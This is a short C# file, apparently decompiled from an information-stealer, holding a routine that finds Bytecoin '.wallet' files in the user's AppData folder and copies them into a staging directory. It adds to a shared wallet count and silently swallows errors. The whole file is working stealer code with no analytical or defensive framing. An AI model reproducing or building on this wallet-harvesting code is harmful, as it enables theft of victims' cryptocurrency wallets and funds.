﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x02000030 RID: 48
	internal class Bytecoin
	{
		// Token: 0x060000F7 RID: 247 RVA: 0x00005F00 File Offset: 0x00004100
		public static void BCNcoinStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\bytecoin").GetFiles())
				{
					Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
					if (fileInfo.Extension.Equals(".wallet"))
					{
						fileInfo.CopyTo(directorypath + "\\Bytecoin\\" + fileInfo.Name);
					}
				}
				Bytecoin.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x0400007A RID: 122
		public static int count;
	}
}
